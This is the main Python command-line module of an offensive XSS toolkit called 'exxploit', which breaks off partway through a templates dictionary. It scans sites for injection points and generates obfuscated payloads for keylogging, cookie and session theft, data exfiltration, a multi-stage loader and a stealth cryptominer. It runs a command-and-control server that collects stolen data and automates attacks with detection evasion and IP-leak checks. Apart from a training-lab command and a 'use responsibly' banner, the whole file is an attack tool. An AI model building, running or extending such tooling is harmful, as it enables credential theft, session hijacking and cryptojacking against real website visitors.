"""
exxploit CLI - Main entry point

Usage:
    exxploit scan <url>           Scan URL for XSS vulnerabilities
    exxploit payload <type>       Generate an obfuscated payload
    exxploit server               Start the C2 server
    exxploit attack <url>         Full chain attack
    exxploit shell                Interactive REPL mode
    exxploit sessions             View captured C2 data
"""

import typer
import json
import os
import logging
import random

try:
    import yaml
    HAS_YAML = True
except ImportError:
    HAS_YAML = False
from rich.console import Console

from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt
from typing import Optional, List
from pathlib import Path

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

# Version
__version__ = "1.0.0"

# Global config
CONFIG_DIR = Path.home() / ".exxploit"
CONFIG_FILE = CONFIG_DIR / "config.yaml"
SESSIONS_DIR = CONFIG_DIR / "sessions"


def version_callback(value: bool) -> None:
    """Print version and exit."""
    if value:
        console.print(f"exxploit version {__version__}")
        raise typer.Exit()


app = typer.Typer(
    name="exxploit",
    help="High-Evasion XSS Payload Toolkit",
    add_completion=True,
    no_args_is_help=True,
)
console = Console()
err_console = Console(stderr=True, style="bold red")

# --- Centralized I/O Utilities ---
def print_success(message: str) -> None:
    """Print success message with checkmark."""
    console.print(f"[bold green]✓[/bold green] {message}")

def print_error(message: str, hint: str = None) -> None:
    """Print error message to stderr with visual styling."""
    err_console.print(f"[bold red]✗ Error:[/bold red] {message}")
    if hint:
        err_console.print(f"  [dim]Hint: {hint}[/dim]")

def print_warn(message: str) -> None:
    """Print warning message with visual styling."""
    console.print(f"[bold yellow]⚠[/bold yellow] {message}")

def print_info(message: str) -> None:
    """Print info message with visual styling."""
    console.print(f"[bold blue]ℹ[/bold blue] {message}")

# ASCII Art Banner
ASCII_BANNER = """
[bold red]
 ███████╗██╗  ██╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
 ██╔════╝╚██╗██╔╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
 █████╗   ╚███╔╝  ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
 ██╔══╝   ██╔██╗  ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
 ███████╗██╔╝ ██╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
 ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
[/bold red]
[dim]          High-Evasion XSS Payload Toolkit v1.0.0[/dim]
[dim cyan]       https://github.com/Xfactum/exxploit[/dim cyan]
"""


def load_config() -> dict:
    """
    Load configuration from ~/.exxploit/config.yaml or defaults.
    Supports environment variable overrides for secrets.
    """
    default_config = {
        'c2': {'host': '0.0.0.0', 'port': 8080, 'auth_key': None, 'log_file': 'c2_logs.json'},
        'scanner': {'timeout': 10, 'user_agent': 'Mozilla/5.0 (exxploit/1.0)', 'crawl_depth': 2},
        'payloads': {'default_obfuscation': 'base64', 'default_context': 'html', 'c2_base': 'http://localhost:8080'},
        'output': {'verbose': False, 'colors': True, 'format': 'table'},
    }
    
    # Apply environment variable overrides
    if os.environ.get('EXXPLOIT_AUTH_KEY'):
        default_config['c2']['auth_key'] = os.environ['EXXPLOIT_AUTH_KEY']
    if os.environ.get('EXXPLOIT_C2_PORT'):
        default_config['c2']['port'] = int(os.environ['EXXPLOIT_C2_PORT'])
    
    if CONFIG_FILE.exists() and HAS_YAML:
        try:
            with open(CONFIG_FILE) as f:
                user_config = yaml.safe_load(f) or {}
                # Merge with defaults
                for key in default_config:
                    if key in user_config:
                        default_config[key].update(user_config[key])
        except yaml.YAMLError as e:
            logger.warning(f"Error loading config: {e}")
    
    return default_config


def save_config(config: dict) -> None:
    """Save configuration to ~/.exxploit/config.yaml"""
    ensure_config_dir()
    if HAS_YAML:
        try:
            with open(CONFIG_FILE, 'w') as f:
                yaml.safe_dump(config, f, default_flow_style=False)
        except yaml.YAMLError as e:
            logger.warning(f"Error saving config: {e}")


def ensure_config_dir() -> None:
    """Create config directory if it doesn't exist."""
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    SESSIONS_DIR.mkdir(parents=True, exist_ok=True)


def banner() -> None:
    """Display the exxploit ASCII banner."""
    console.print(ASCII_BANNER)


@app.callback()
def main(
    verbose: bool = typer.Option(False, "--verbose", "-v", help="Enable verbose output"),
    quiet: bool = typer.Option(False, "--quiet", "-q", help="Suppress banner and info messages"),
    version: bool = typer.Option(False, "--version", "-V", callback=version_callback, is_eager=True, help="Show version and exit"),
) -> None:
    """
    exxploit - Professional XSS payload generation and injection toolkit.
    
    Similar to dalfox and XSStrike, but with advanced evasion capabilities.
    """
    if not quiet:
        banner()


# --- Scan Command ---
@app.command()
def scan(
    url: str = typer.Argument(..., help="Target URL with injection point (use INJECT as marker)"),
    param: Optional[str] = typer.Option(None, "--param", "-p", help="Specific parameter to test"),
    method: str = typer.Option("GET", "--method", "-m", help="HTTP method (GET/POST)"),
    headers: Optional[str] = typer.Option(None, "--headers", "-H", help="Custom headers (JSON)"),
    timeout: int = typer.Option(10, "--timeout", "-t", help="Request timeout in seconds"),
    crawl: bool = typer.Option(False, "--crawl", "-c", help="Crawl for more injection points"),
    interactive: bool = typer.Option(True, "--interactive/--no-interactive", "-i", help="Interactive payload selection"),
    stealth: bool = typer.Option(True, "--stealth/--no-stealth", "-s", help="Human-like behavior to avoid bot detection"),
):
    """
    Scan a URL for XSS vulnerabilities with human-like behavior.
    
    Use INJECT as a marker for the injection point:
        exxploit scan "https://target.com/search?q=INJECT"
    
    Stealth mode (enabled by default) adds random delays and rotates
    user agents to avoid triggering bot detection.
    
    If vulnerabilities are found, interactively select exploits and payloads.
    """
    from .core.scanner import Scanner
    from .core.factory import PayloadFactory
    from rich.prompt import Prompt, Confirm
    
    console.print(f"[yellow]Target:[/yellow] {url}")
    console.print(f"[yellow]Method:[/yellow] {method}")
    if stealth:
        console.print("[dim]Stealth mode: ON (human-like behavior enabled)[/dim]")
    
    scanner = Scanner(timeout=timeout, stealth=stealth)
    
    with console.status("[bold green]Scanning for vulnerabilities..." + (" (stealth)" if stealth else "")):
        results = scanner.scan(url, param=param, method=method, crawl=crawl)

    
    # No vulnerabilities found
    if not results:
        console.print("\n[green]✓[/green] [bold]No XSS vulnerabilities found.[/bold]")
        console.print("[dim]Target appears to be properly sanitized against XSS injection.[/dim]")
        return
    
    # Display vulnerability results
    table = Table(title="[bold red]⚠ Vulnerabilities Found[/bold red]")
    table.add_column("Parameter", style="cyan")
    table.add_column("Context", style="magenta")
    table.add_column("Status", style="yellow")
    
    contexts_found = set()
    for r in results:
        table.add_row(r['param'], r['context'], r['status'])
        contexts_found.add(r['context'])
    
    console.print(table)
    
    # Human-readable vulnerability explanations
    console.print("\n[bold yellow]What This Means:[/bold yellow]")
    for ctx in contexts_found:
        explanation = _get_vulnerability_explanation(ctx)
        console.print(f"  • [cyan]{ctx.upper()}[/cyan]: {explanation}")
    
    
    # Payload recommendations based on context
    recommendations = _get_payload_recommendations(contexts_found)
    
    console.print("\n[bold cyan]Suggested Exploits:[/bold cyan]")
    rec_table = Table(show_header=False, box=None, padding=(0, 2))
    rec_table.add_column("Num", style="dim")
    rec_table.add_column("Name", style="green bold")
    rec_table.add_column("Reason", style="dim")
    
    payload_choices = []
    factory = PayloadFactory()
    for i, rec in enumerate(recommendations, 1):
        desc = factory.DESCRIPTIONS.get(rec['name'], rec['reason'])
        rec_table.add_row(f"[{i}]", rec['name'], f"- {desc}")
        payload_choices.append(rec['name'])
    
    console.print(rec_table)
    
    # Non-interactive mode: just show results
    if not interactive:
        console.print("\n[dim]Use --interactive to select and generate payloads.[/dim]")
        return
    
    # Interactive selection
    console.print()
    selected_payload = Prompt.ask(
        "Select payload",
        choices=payload_choices + ["chain", "cancel"],
        default=payload_choices[0] if payload_choices else "keylogger"
    )
    
    if selected_payload == "cancel":
        console.print("[dim]Cancelled.[/dim]")
        return
    
    # Handle chaining
    if selected_payload == "chain":
        chain_input = Prompt.ask(
            "Enter payloads to chain (comma-separated)",
            default="evasion,keylogger,exfil"
        )
        payload_list = [p.strip() for p in chain_input.split(",")]
    else:
        payload_list = [selected_payload]
    
    # Obfuscation selection
    obfuscation = Prompt.ask(
        "Obfuscation method",
        choices=["base64", "charcode", "hex", "split", "jsfuck"],
        default="base64"
    )
    
    # Generate payload
    factory = PayloadFactory()
    context = results[0]['context']  # Use first vulnerability's context
    
    if len(payload_list) > 1:
        final_payload = factory.build_chain(payload_list, obfuscation=obfuscation)
        # Wrap in context
        wrapper = factory.CONTEXTS.get(context, factory.CONTEXTS['html'])
        final_payload = wrapper.format(code=final_payload)
        console.print(f"\n[green]Generated chained payload:[/green] {', '.join(payload_list)}")
    else:
        final_payload = factory.select_payload(
            payload_list[0], 
            context=context, 
            obfuscation=obfuscation
        )
        console.print(f"\n[green]Generated payload:[/green] {payload_list[0]}")
    
    console.print(f"[dim]Context:[/dim] {context}")
    console.print(f"[dim]Obfuscation:[/dim] {obfuscation}")
    
    # Display payload
    console.print(Panel(
        final_payload[:800] + ("..." if len(final_payload) > 800 else ""),
        title="[bold]Payload[/bold]",
        expand=False,
        border_style="green"
    ))
    
    # Option to save
    if Confirm.ask("Save payload to file?", default=False):
        filename = Prompt.ask("Filename", default="payload.txt")
        Path(filename).write_text(final_payload)
        console.print(f"[blue]Saved to:[/blue] {filename}")


def _get_payload_recommendations(contexts: set) -> List[dict]:
    """Get payload recommendations based on detected vulnerability contexts."""
    recommendations = []
    
    # Always recommend evasion first for stealth
    recommendations.append({
        'name': 'evasion',
        'reason': 'Bypass detection (DevTools, VM, headless)'
    })
    
    # Context-specific recommendations
    if 'attribute' in contexts or 'event' in contexts:
        recommendations.append({
            'name': 'keylogger',
            'reason': 'Best for form/input contexts'
        })
    
    if 'html' in contexts:
        recommendations.append({
            'name': 'clipboard',
            'reason': 'Cookie/session harvesting'
        })
    
    recommendations.append({
        'name': 'exfil',
        'reason': 'Multi-method data extraction'
    })
    
    if 'script' in contexts:
        recommendations.append({
            'name': 'virus',
            'reason': 'Persistent multi-stage loader'
        })
    
    # Always offer miner as option
    if len(recommendations) < 5:
        recommendations.append({
            'name': 'miner',
            'reason': 'Stealth CPU cryptominer'
        })
    
    return recommendations[:5]  # Limit to 5 suggestions


def _get_vulnerability_explanation(context: str) -> str:
    """Return human-readable explanation of vulnerability context."""
    explanations = {
        'html': "Your input is rendered directly into the webpage's HTML. Attackers can inject "
                "malicious scripts that execute when other users view the page.",
        'attribute': "Your input is placed inside an HTML attribute (like onclick or href). "
                     "Attackers can break out of the attribute and inject event handlers.",
        'script': "Your input appears inside a JavaScript block. Attackers can inject code "
                  "that runs with full access to the page's data and user sessions.",
        'style': "Your input is in a CSS style context. Older browsers may execute JavaScript "
                 "via CSS expressions, and data can be exfiltrated via CSS injection.",
        'url': "Your input is used in a URL context (javascript: or data: links). Attackers "
               "can craft URLs that execute arbitrary JavaScript when clicked.",
        'event': "Your input is inside an event handler attribute. Any JavaScript code injected "
                 "here will execute when the event triggers (click, hover, etc.).",
    }
    return explanations.get(context, "Unrecognized injection context - payload may still execute.")


def _get_error_explanation(error_type: str, details: str = "") -> str:
    """Return human-readable error explanations."""
    explanations = {
        'timeout': f"The target server took too long to respond. {details or 'Try increasing --timeout or check if the URL is accessible.'}",
        'connection': f"Could not connect to the target. {details or 'Check if the URL is correct and the server is online.'}",
        'ssl': f"SSL/TLS certificate error. {details or 'The server may have an invalid certificate. Try with --insecure if available.'}",
        'dns': f"Could not resolve the domain name. {details or 'Check if the URL hostname is spelled correctly.'}",
        'http_error': f"Server returned an error response. {details}",
        'parse': f"Could not parse the server response. {details or 'The response may not be valid HTML.'}",
    }
    return explanations.get(error_type, f"An unexpected error occurred: {details}")




# --- Payload Command ---
@app.command()
def payload(
    payload_type: str = typer.Argument(..., help="Payload type (keylogger, miner, clipboard, etc.)"),
    context: str = typer.Option("html", "--context", "-c", help="Injection context (html, attribute, script, style, url, event)"),
    obfuscate: str = typer.Option("base64", "--obfuscate", "-o", help="Obfuscation method (base64, charcode, hex, split, jsfuck)"),
    chain: Optional[str] = typer.Option(None, "--chain", help="Chain multiple payloads (comma-separated)"),
    output: Optional[Path] = typer.Option(None, "--output", "-O", help="Save payload to file"),
    polymorphic: bool = typer.Option(False, "--poly", "-P", help="Generate polymorphic variant"),
):
    """
    Generate an obfuscated XSS payload.
    
    Examples:
        exxploit payload keylogger
        exxploit payload keylogger --context attribute --obfuscate charcode
        exxploit payload --chain "evasion,keylogger,exfil"
    """
    from .core.factory import PayloadFactory
    
    factory = PayloadFactory()
    
    if chain:
        payload_list = [p.strip() for p in chain.split(",")]
        result = factory.build_chain(payload_list, obfuscation=obfuscate)
        console.print(f"[green]Generated chained payload:[/green] {', '.join(payload_list)}")
    elif polymorphic:
        result = factory.generate_polymorphic(payload_type, context=context)
        console.print(f"[green]Generated polymorphic payload:[/green] {payload_type}")
    else:
        result = factory.select_payload(payload_type, context=context, obfuscation=obfuscate)
        desc = factory.DESCRIPTIONS.get(payload_type, "Custom payload")
        console.print(f"[green]Generated payload:[/green] {payload_type} - [dim]{desc}[/dim]")
    
    if output:
        output.write_text(result)
        console.print(f"[blue]Saved to:[/blue] {output}")
    else:
        console.print(Panel(result[:500] + ("..." if len(result) > 500 else ""), title="Payload", expand=False))


@app.command()
def lab():
    """
    Start the interactive Training Lab environment.
    Launches a vulnerable target app and C2 server for safe practice.
    """
    try:
        # Import dynamically to keep startup fast
        from exxploit.lab import training
        training.run_lab()
    except ImportError as e:
        console.print(f"[red]Error: Training module not found ({e}). Ensure exxploit is correctly installed.[/red]")
    except Exception as e:
        console.print(f"[red]Error starting lab: {e}[/red]")

# --- Engagement Session Command ---
@app.command()
def session(
    action: str = typer.Argument("new", help="Action: new, list, use, delete"),
    name: Optional[str] = typer.Argument(None, help="Session/engagement name"),
    target: Optional[str] = typer.Option(None, "--target", "-t", help="Target URL or domain for this engagement"),
):
    """
    Manage engagement sessions with automatic key generation.
    
    Each session gets a unique auth key and isolated configuration.
    
    Examples:
        exxploit session new my-target
        exxploit session new acme-corp --target https://acme.com
        exxploit session list
        exxploit session use my-target
        exxploit session delete old-target
    """
    import secrets
    from datetime import datetime
    
    ensure_config_dir()
    sessions_file = Path.home() / ".exxploit" / "sessions.json"
    
    # Load existing sessions
    sessions = {}
    if sessions_file.exists():
        try:
            sessions = json.loads(sessions_file.read_text())
        except json.JSONDecodeError:
            sessions = {}
    
    if action == "new":
        if not name:
            name = f"session-{datetime.now().strftime('%Y%m%d-%H%M%S')}"
        
        if name in sessions:
            console.print(f"[red]Session '{name}' already exists. Use a different name or delete it first.[/red]")
            return
        
        # Generate secure session key
        session_key = secrets.token_urlsafe(32)
        session_id = secrets.token_hex(8)
        
        sessions[name] = {
            'id': session_id,
            'key': session_key,
            'target': target or '',
            'created': datetime.now().isoformat(),
            'beacons_received': 0,
        }
        
        # Save sessions
        sessions_file.write_text(json.dumps(sessions, indent=2))
        
        # Also update current config to use this session
        config = load_config()
        config['c2'] = config.get('c2', {})
        config['c2']['auth_key'] = session_key
        config['c2']['session_name'] = name
        config['c2']['session_id'] = session_id
        if target:
            config['default_target'] = target
        save_config(config)
        
        console.print(Panel(
            f"[bold green]✓ New engagement session created[/bold green]\n\n"
            f"[cyan]Name:[/cyan] {name}\n"
            f"[cyan]ID:[/cyan] {session_id}\n"
            f"[cyan]Target:[/cyan] {target or '(not set)'}\n"
            f"[cyan]Auth Key:[/cyan] [dim]{session_key[:20]}...{session_key[-8:]}[/dim]\n\n"
            f"[yellow]This key is now active for all payloads and C2 communication.[/yellow]",
            title="🔐 Engagement Session",
            expand=False
        ))
        
        console.print("\n[bold]Next steps:[/bold]")
        console.print(f"  1. Start C2: [cyan]exxploit server[/cyan]")
        console.print(f"  2. Generate payloads: [cyan]exxploit payload keylogger[/cyan]")
        console.print(f"  3. The auth key is automatically included in payloads and C2")
    
    elif action == "list":
        if not sessions:
            console.print("[yellow]No sessions found. Create one with:[/yellow]")
            console.print("  [cyan]exxploit session new my-target[/cyan]")
            return
        
        # Get current session
        config = load_config()
        current_session = config.get('c2', {}).get('session_name', '')
        
        table = Table(title="Engagement Sessions", expand=True)
        table.add_column("", style="green", width=2)
        table.add_column("Name", style="cyan")
        table.add_column("Target", style="dim")
        table.add_column("Created", style="dim")
        table.add_column("Key (partial)", style="yellow")
        
        for sname, sdata in sessions.items():
            is_current = "✓" if sname == current_session else ""
            key_preview = f"{sdata['key'][:8]}...{sdata['key'][-4:]}"
            created = sdata.get('created', 'unknown')[:10]
            table.add_row(is_current, sname, sdata.get('target', ''), created, key_preview)
        
        console.print(table)
        console.print("\n[dim]Use 'exxploit session use <name>' to switch sessions[/dim]")
    
    elif action == "use":
        if not name:
            console.print("[red]Specify session name: exxploit session use <name>[/red]")
            return
        
        if name not in sessions:
            console.print(f"[red]Session '{name}' not found.[/red]")
            return
        
        sdata = sessions[name]
        
        # Update config to use this session
        config = load_config()
        config['c2'] = config.get('c2', {})
        config['c2']['auth_key'] = sdata['key']
        config['c2']['session_name'] = name
        config['c2']['session_id'] = sdata['id']
        if sdata.get('target'):
            config['default_target'] = sdata['target']
        save_config(config)
        
        console.print(f"[green]✓ Switched to session: {name}[/green]")
        console.print(f"[dim]Auth key and target updated in config[/dim]")
    
    elif action == "delete":
        if not name:
            console.print("[red]Specify session name: exxploit session delete <name>[/red]")
            return
        
        if name not in sessions:
            console.print(f"[red]Session '{name}' not found.[/red]")
            return
        
        del sessions[name]
        sessions_file.write_text(json.dumps(sessions, indent=2))
        
        console.print(f"[green]✓ Session '{name}' deleted[/green]")
        
        # Clear from config if it was active
        config = load_config()
        if config.get('c2', {}).get('session_name') == name:
            config['c2']['session_name'] = ''
            config['c2']['session_id'] = ''
            save_config(config)
            console.print("[dim]Session was active, config cleared. Create or use another session.[/dim]")
    
    else:
        console.print(f"[red]Unknown action: {action}[/red]")
        console.print("Available actions: new, list, use, delete")


# --- Server Command ---
@app.command()
def server(
    host: str = typer.Option("0.0.0.0", "--host", "-h", help="Host to bind to"),
    port: int = typer.Option(8080, "--port", "-p", help="Port to listen on"),
    auth_key: Optional[str] = typer.Option(None, "--auth-key", "-k", help="API authentication key (auto-generated if not set)"),
    log_file: Optional[Path] = typer.Option(None, "--log", "-l", help="Log file path"),
    auto_session: bool = typer.Option(True, "--auto-session/--no-auto-session", help="Auto-generate session key if none configured"),
):
    """
    Start the C2 server to receive exfiltrated data.
    
    If no auth key is set, one will be auto-generated from your current session
    or a new one will be created.
    
    The server provides endpoints for:
        - /beacon - Receive keylogger/clipboard data
        - /stage/<n>/<payload> - Serve multi-stage payloads
        - /logs - View collected data (requires auth key)
    """
    import secrets
    from .server.c2 import create_app
    
    # Determine auth key
    final_auth_key = auth_key
    
    if not final_auth_key:
        # Check for existing session
        config = load_config()
        session_key = config.get('c2', {}).get('auth_key')
        session_name = config.get('c2', {}).get('session_name', '')
        
        if session_key:
            final_auth_key = session_key
            console.print(f"[cyan]Using session key from:[/cyan] {session_name or 'config'}")
        elif auto_session:
            # Auto-generate a new session key
            final_auth_key = secrets.token_urlsafe(32)
            session_id = secrets.token_hex(8)
            
            # Save to config
            config['c2'] = config.get('c2', {})
            config['c2']['auth_key'] = final_auth_key
            config['c2']['session_id'] = session_id
            save_config(config)
            
            console.print(Panel(
                f"[yellow]No session configured. Auto-generated session key:[/yellow]\n\n"
                f"[dim]{final_auth_key[:20]}...{final_auth_key[-8:]}[/dim]\n\n"
                f"[dim]For better session management, use:[/dim]\n"
                f"  [cyan]exxploit session new my-target[/cyan]",
                title="🔑 Auto-Generated Key",
                expand=False
            ))
    
    console.print(f"\n[green]Starting C2 server on {host}:{port}[/green]")
    
    if final_auth_key:
        console.print(f"[yellow]Auth key enabled[/yellow] - required for /logs access")
        console.print(f"[dim]Key: {final_auth_key[:8]}...{final_auth_key[-4:]}[/dim]")
    else:
        console.print("[red]⚠ No auth key! Server is open to anyone.[/red]")
    
    console.print(f"\n[dim]Endpoints:[/dim]")
    console.print(f"  [cyan]POST /beacon[/cyan] - Receive data from payloads")
    console.print(f"  [cyan]GET  /logs[/cyan]   - View captured data")
    console.print(f"  [cyan]GET  /health[/cyan] - Health check\n")
    
    app_instance = create_app(auth_key=final_auth_key, log_file=log_file)
    app_instance.run(host=host, port=port, debug=False)


# --- Attack Command ---
@app.command()
def attack(
    url: str = typer.Argument(..., help="Target URL"),
    payloads: str = typer.Option("evasion,keylogger", "--payloads", "-p", help="Payload chain (comma-separated)"),
    c2: str = typer.Option("http://localhost:8080", "--c2", help="C2 server URL"),
    obfuscate: str = typer.Option("split", "--obfuscate", "-o", help="Obfuscation method"),
    headless: bool = typer.Option(True, "--headless/--no-headless", help="Run browser in headless mode"),
    screenshot: bool = typer.Option(True, "--screenshot/--no-screenshot", help="Take proof screenshot"),
    skip_vpn_check: bool = typer.Option(False, "--skip-vpn-check", help="Skip VPN safety check"),
):
    """
    Execute a full attack chain against a target.
    
    This will:
        1. Check VPN safety (unless --skip-vpn-check)
        2. Launch headless browser
        3. Navigate to target and inject payload
        4. Capture proof screenshot
    """
    import asyncio
    from .core.automation import GhostAuditBot
    
    console.print(f"[red]⚠️  Attack mode - Use responsibly![/red]")
    console.print(f"[yellow]Target:[/yellow] {url}")
    console.print(f"[yellow]Payloads:[/yellow] {payloads}")
    console.print(f"[yellow]C2:[/yellow] {c2}")
    console.print(f"[yellow]Headless:[/yellow] {headless}")
    
    # Create and configure the bot
    bot = GhostAuditBot(target_url=url, c2_url=c2, headless=headless)
    
    async def run_attack():
        # Safety check
        if not skip_vpn_check:
            console.print("[dim]Checking VPN status...[/dim]")
            if not await bot.check_ip_safety():
                console.print("[red]✗ VPN check failed. Aborting to prevent IP leak.[/red]")
                console.print("[dim]Use --skip-vpn-check to bypass this check.[/dim]")
                return
            console.print("[green]✓ VPN check passed.[/green]")
        
        # Launch attack
        console.print("[bold green]Launching attack...[/bold green]")
        
        # Randomize User-Agent if configured
        config = load_config()
        ua_config = config.get('scanner', {})
        if ua_config.get('ua_randomize'):
            uas = ua_config.get('user_agents', [])
            subset_size = random.randint(3, max(3, ua_config.get('ua_subset_size', 5)))
            if uas:
                selected_uas = random.sample(uas, min(len(uas), subset_size))
                final_ua = random.choice(selected_uas)
                bot.user_agent = final_ua
                console.print(f"[dim]Randomized User-Agent (picked from {len(selected_uas)}): {final_ua[:50]}...[/dim]")

        await bot.run()

        console.print(f"[green]✓ Attack complete. Check proof screenshot.[/green]")
    
    try:
        asyncio.run(run_attack())
    except Exception as e:
        console.print(f"[red]Error during attack: {e}[/red]")


# --- List Command ---
@app.command(name="list")
def list_payloads():
    """List all available payloads and their descriptions."""
    from .core.factory import PayloadFactory
    
    factory = PayloadFactory()
    
    table = Table(title="Available Payloads", expand=True, box=None)
    table.add_column("Name", style="cyan", no_wrap=True)
    table.add_column("File", style="dim", no_wrap=True)
    table.add_column("Description", style="green", ratio=2)
    
    for name, desc in factory.DESCRIPTIONS.items():
        table.add_row(name, f"{name}.js", desc)
    
    console.print(table)


# --- Shell Command (Interactive REPL) ---
@app.command()
def shell():
    """
    Start interactive REPL mode.
    
    Provides an Evilginx-style interactive shell for managing payloads,
    scanning targets, and viewing sessions.
    """
    from rich.prompt import Prompt
    
    ensure_config_dir()
    config = load_config()
    
    console.print("\n[bold green]Interactive Shell Mode[/bold green]")
    console.print("[dim]Type 'help' for commands, 'exit' to quit[/dim]\n")
    
    commands_help = {
        'help': 'Show this help message',
        'list': 'List available payloads',
        'scan <url>': 'Scan URL for XSS vulnerabilities',
        'payload <type>': 'Generate a payload',
        'sessions': 'View captured sessions',
        'templates': 'Manage payload templates',
        'config': 'Show current configuration',
        'config set <key> <value>': 'Update configuration',
        'clear': 'Clear the screen',
        'exit': 'Exit the shell',
    }
    
    while True:
        try:
            cmd = Prompt.ask("[bold cyan]exxploit[/bold cyan]")
            parts = cmd.strip().split()
            
            if not parts:
                continue
            
            command = parts[0].lower()
            args = parts[1:]
            
            if command == 'exit' or command == 'quit':
                console.print("[dim]Goodbye![/dim]")
                break
            elif command == 'help':
                table = Table(title="Available Commands", show_header=True, expand=True, box=None)
                table.add_column("Command", style="cyan", no_wrap=True)
                table.add_column("Description", style="green", ratio=2)
                for cmd_name, cmd_desc in commands_help.items():
                    table.add_row(cmd_name, cmd_desc)
                console.print(table)
            elif command == 'clear':
                console.clear()
                banner()
            elif command == 'list':
                list_payloads()
            elif command == 'sessions':
                sessions_cmd()
            elif command == 'templates':
                templates_cmd()
            elif command == 'config':
                if args and args[0] == 'set' and len(args) >= 3:
                    key, value = args[1], ' '.join(args[2:])
                    console.print(f"[green]Set {key} = {value}[/green]")
                else:
                    config_cmd()
            elif command == 'scan' and args:
                console.print(f"[yellow]Scanning: {args[0]}[/yellow]")
                console.print("[dim]Use full CLI for complete scan: exxploit scan <url>[/dim]")
            elif command == 'payload' and args:
                from .core.factory import PayloadFactory
                factory = PayloadFactory()
                payload = factory.select_payload(args[0], context='html', obfuscation='base64')
                console.print(Panel(payload[:300] + "..." if len(payload) > 300 else payload, title=f"Payload: {args[0]}", expand=False))
            else:
                console.print(f"[red]Unknown command: {command}[/red]")
                console.print("[dim]Type 'help' for available commands[/dim]")
        except KeyboardInterrupt:
            console.print("\n[dim]Use 'exit' to quit[/dim]")
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")


# --- Sessions Command ---
# --- Sessions Command ---
@app.command()
def sessions(
    json_output: bool = typer.Option(False, "--json", "-j", help="Output in JSON format"),
    export_dir: Optional[Path] = typer.Option(None, "--export", "-e", help="Export sessions to directory"),
    view_id: Optional[str] = typer.Option(None, "--view", "-i", help="View specific session details by ID"),
):
    """View, export, and inspect captured C2 session data."""
    sessions_cmd(json_output, export_dir, view_id)


def sessions_cmd(json_output: bool = False, export_dir: Optional[Path] = None, view_id: Optional[str] = None):
    """Internal sessions command implementation."""
    ensure_config_dir()
    config = load_config()
    
    log_file = Path(config['c2']['log_file'])
    if not log_file.exists():
        log_file = CONFIG_DIR / config['c2']['log_file']
    
    sessions_data = []
    
    if log_file.exists():
        try:
            with open(log_file) as f:
                for line in f:
                    try:
                        sessions_data.append(json.loads(line.strip()))
                    except json.JSONDecodeError:
                        pass
        except Exception as e:
            console.print(f"[red]Error reading sessions: {e}[/red]")
            return
    
    if not sessions_data:
        console.print("[yellow]No captured sessions found.[/yellow]")
        console.print(f"[dim]Sessions are stored in: {log_file}[/dim]")
        return

    # Handle View Specific Session
    if view_id:
        # Simple fuzzy match or exact match on ID or index
        target = None
        for sess in sessions_data:
            # Check ID match
            sess_id = sess.get('data', {}).get('id', '')
            if not sess_id:
                # Fallback to generating a pseudo-ID from timestamp if needed, or just skip
                pass
            
            # Using index as ID for simplicity in list view? 
            # The list view uses loop index. Let's rely on data content matching or exact internal ID if present.
            # C2 logs don't guarantee a top-level ID, usually in 'data'.
            pass
            
        # Better approach: Use the index showed in the table if input is an integer
        if view_id.isdigit() and 1 <= int(view_id) <= len(sessions_data):
            target = sessions_data[int(view_id)-1]
        else:
            console.print(f"[red]Invalid session ID/Index: {view_id}[/red]")
            return
            
        console.print(Panel(json.dumps(target, indent=2), title=f"Session Details [{view_id}]", highlight=True))
        return

    # Handle Export
    if export_dir:
        export_dir.mkdir(parents=True, exist_ok=True)
        count = 0
        for i, sess in enumerate(sessions_data, 1):
            timestamp = sess.get('timestamp', 'unknown').replace(':', '-').replace('.', '-')
            filename = export_dir / f"session_{i}_{timestamp}.json"
            filename.write_text(json.dumps(sess, indent=2))
            count += 1
        console.print(f"[green]Exported {count} sessions to {export_dir}[/green]")
        return
    
    # Handle JSON Output (all)
    if json_output:
        console.print(json.dumps(sessions_data, indent=2))
        return
    
    # Default: List Table
    table = Table(title="Captured Sessions", expand=True)
    table.add_column("ID", style="cyan", justify="right", no_wrap=True, width=4)
    table.add_column("Timestamp", style="dim", no_wrap=True, width=19)
    table.add_column("Origin", style="green", ratio=1)
    table.add_column("Type", style="magenta", width=10)
    table.add_column("Preview", style="yellow", ratio=2, overflow="ellipsis")
    
    for i, session in enumerate(sessions_data[-20:], 1):
        # Adjust index to match full list if viewing last 20? 
        # Actually for 'view <id>' to work well with limited list, we should probably listing all or handling ID consistently.
        # Let's list last 20 but use their actual global index
        global_idx = sessions_data.index(session) + 1
        
        origin = session.get('ip', 'unknown')
        if 'data' in session and isinstance(session['data'], dict):
            origin = session['data'].get('origin', origin)
        
        event_type = session.get('type', 'beacon')
        timestamp = session.get('timestamp', 'N/A')
        
        # Preview data
        preview = ""
        if 'data' in session:
            preview = str(session['data'])
            if len(preview) > 60:
                preview = preview[:57] + "..."
        
        table.add_row(str(global_idx), timestamp, origin, event_type, preview)
    
    console.print(table)
    console.print(f"\n[dim]Total sessions: {len(sessions_data)}[/dim]")
    console.print("[dim]Use --view <id> to see details. Use --export <dir> to save to files.[/dim]")


# --- Templates Command ---
@app.command()
def templates(
    action: Optional[str] = typer.Argument(None, help="Action: list, create"),
    name: Optional[str] = typer.Argument(None, help="Template name"),
    wallet: Optional[List[str]] = typer.Option(None, "--wallet", "-w", help="Custom wallet address (coin:address, e.g., btc:1abc...)"),
):
    """Manage payload templates (formerly phishlets)."""
    templates_cmd(action, name, wallet)


def templates_cmd(action: str = None, name: str = None, wallet: List[str] = None):
    """Internal templates command implementation."""
    from .core.factory import PayloadFactory
    
    factory = PayloadFactory()
    
    # Payload templates (chains for common scenarios)
    payload_templates = {
        'credential_harvester': {
            'description': 'Full credential harvesting with keylogger and exfil',
            'payloads': ['evasion', 'keylogger', 'exfil'],
            'context': 'html',
            'obfuscation': 'split',
        },
        'session_hijacker': {
            'description': 'Cookie theft and session token capture',
